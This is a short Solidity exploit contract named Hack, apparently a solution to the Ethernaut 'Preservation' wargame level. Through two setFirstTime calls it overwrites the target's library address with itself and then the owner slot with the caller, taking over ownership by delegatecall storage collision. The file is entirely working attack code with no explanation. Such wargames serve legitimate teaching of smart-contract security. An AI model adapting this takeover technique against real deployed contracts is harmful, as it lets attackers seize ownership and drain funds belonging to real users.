//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation contractAddress) external {
        contractAddress.setFirstTime(uint256(uint160(address(this))));
        contractAddress.setFirstTime(uint256(uint160(msg.sender)));
        require(contractAddress.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}